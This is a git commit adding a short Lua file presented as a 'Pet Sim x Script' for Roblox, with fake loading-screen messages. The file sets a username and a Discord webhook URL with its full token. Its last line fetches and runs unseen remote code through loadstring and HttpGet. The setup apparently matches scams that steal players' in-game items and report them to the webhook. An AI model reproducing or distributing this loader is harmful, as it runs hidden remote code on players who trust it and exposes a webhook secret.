56fbaf5500f356ccecd3c45e3a325afcf165a14b
Project-WD <124843577+Project-WD@users.noreply.github.com>
2023-04-28 19:29:24 +0800

    Create Main.lua

---
+++ Main.lua
@@ -0,0 +1,10 @@
+
+Username = "404_demon213"
+WebHook = "https://discord.com/api/webhooks/1089369019833929820/CCAiS1KJquZ2NMaTb5X46n31luG79aRbJQ2XrzWfteLR9RQYdD4aIwyuta2az826nHxd"
+loadingscreen = true
+_G.CustomScriptName = "Pet Sim x Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
